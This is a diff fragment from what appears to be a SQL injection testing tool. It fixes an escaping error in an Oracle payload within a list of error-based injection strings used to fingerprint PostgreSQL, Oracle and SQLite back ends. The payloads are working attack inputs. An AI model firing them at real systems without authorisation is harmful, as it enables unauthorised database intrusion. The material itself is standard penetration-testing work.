@@ -631,7 +631,7 @@ class _DbFingerprinter:
         ("' AND 1=CAST((SELECT version()) AS int)-- -",
          DbEngine.POSTGRES,
          re.compile(r"ERROR:\s+invalid input syntax|PostgreSQL|pg_", re.I)),
-        ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v\$version WHERE ROWNUM=1))-- -",
+        ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
          DbEngine.ORACLE,
          re.compile(r"ORA-\d+|Oracle.*error", re.I)),
         ("' UNION SELECT NULL,sqlite_version()-- -",
